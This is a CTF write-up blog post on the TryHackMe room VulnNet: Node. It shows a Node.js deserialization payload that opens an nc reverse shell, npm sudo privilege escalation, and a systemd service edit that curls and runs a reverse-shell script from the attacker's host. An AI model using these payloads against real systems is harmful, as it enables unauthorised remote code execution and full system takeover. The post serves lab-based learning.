---
title: VulnNet:Node - Writeup
author: Elman Alizadeh
date: 2022-06-09 20:00:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, vulnnet]
---

Today we will take a look at TryHackMe:VulnNet: Node. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/1.png" | relative_url }})

## Network scan

```console
sudo nmap -p- -sCV --open 10.10.41.219

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
|_http-open-proxy: Proxy might be redirecting requests
```

## Web

![Desktop View]({{ "/assets/img/thm-vulnnet-node/2.png" | relative_url }})

When we first look at it, it greets us as a guest.

Let’s refresh the page and catch the request with burpsuite.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/3.png" | relative_url }})

When we look at the request, we see that the website gives us cookie. Let’s decode and look at the contents.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/4.png" | relative_url }})

We see that he marks us as guests. Replacing with admin and sending the request again.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/5.png" | relative_url }})

We see that the response is “Welcome Admin”. It worked. But when we try to log in, we see that he wants the password again.

I received such an answer when I changed the cookie.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/6.png" | relative_url }})

I pasted the sentence on Google. There is such an article.

[Exploit_node.js](https://ajinabraham.com/blog/exploiting-deserialization-bugs-in-nodejs-modules-for-remote-code-execution)

It’s time to get the reverse shell.

## Reverse Shell

```console
{"username":"_$$ND_FUNC$$_function(){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()","isAdmin":true,"encoding": "utf-8"}
```

Encode and send request.

![Desktop View]({{ "/assets/img/thm-vulnnet-node/7.png" | relative_url }})

Listen:

Command: nc -nvlp 4444

![Desktop View]({{ "/assets/img/thm-vulnnet-node/8.png" | relative_url }})

## serv-manage

After logging in:

```console
Command: script /dev/null -c bash

Command: export TERM=xterm

Ctrl + z

Command: stty raw -echo ; fg

Command: reset

www@vulnnet-node:~/VulnNet-Node$ sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

[npm_GTFO](https://gtfobins.github.io/gtfobins/npm/#sudo)

```console
www@vulnnet-node:~/VulnNet-Node$ mkdir exploit

www@vulnnet-node:~/VulnNet-Node$ echo '{"scripts": {"preinstall": "/bin/bash"}}' > exploit/package.json

www@vulnnet-node:~/VulnNet-Node$ sudo -u serv-manage npm -C exploit --unsafe-perm i
```

## Root

```console
serv-manage@vulnnet-node:/home/www/VulnNet-Node/exploit$ sudo -l

Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload

serv-manage@vulnnet-node: locate vulnnet-auto.timer

serv-manage@vulnnet-node: cat /etc/systemd/system/vulnnet-auto.timer

--------------------------------
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
--------------------------------

serv-manage@vulnnet-node: locate vulnnet-job.service

serv-manage@vulnnet-node: cat /etc/systemd/system/vulnnet-job.service

---------------------------------
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
---------------------------------
```

We see something like this here. “ExecStart = / bin / df” Here we can execute the command and get the reverse shell.

First, let’s prepare a payload on our own machine.

Exploit.sh

```console
$ nano exploit.sh

#!/bin/bash

bash -i >& /dev/tcp/Your_IP/4242 0>&1
```

Command: python3 -m http.server 80

In the target machine

```console
ExecStart=/bin/bash -c "curl http://Your_İP/exploit.sh | bash"
```

Local machine:

Command: nc -nvlp 4242

In the target machine

```console
serv-manage@vulnnet-node: sudo -u root /bin/systemctl stop vulnnet-auto.timer

serv-manage@vulnnet-node: sudo -u root /bin/systemctl start vulnnet-auto.timer
```

![Desktop View]({{ "/assets/img/thm-vulnnet-node/9.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/thm-vulnnet-node/10.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”